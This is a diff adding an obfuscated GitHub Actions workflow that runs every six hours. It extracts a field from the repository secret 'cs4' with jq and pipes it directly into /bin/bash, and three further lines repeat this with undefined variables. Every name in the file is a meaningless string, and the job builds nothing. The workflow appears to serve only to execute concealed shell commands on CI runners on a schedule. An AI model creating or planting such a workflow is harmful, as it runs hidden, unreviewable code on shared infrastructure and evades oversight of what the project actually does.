@@ -1,0 +1,20 @@
+name: liangyizhi3178
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangyizhi3178
+        env:
+          cs4: ${{ secrets.cs4 }}
+        run: |
+          echo $cs4 | jq -r .nre957 | /bin/bash
+          echo $lgrzh1 | jq -r .wxfht38 | /bin/bash
+          echo $esm34413 | jq -r .rs715 | /bin/bash
+          echo $bflrq03 | jq -r .cbvli562 | /bin/bash
+
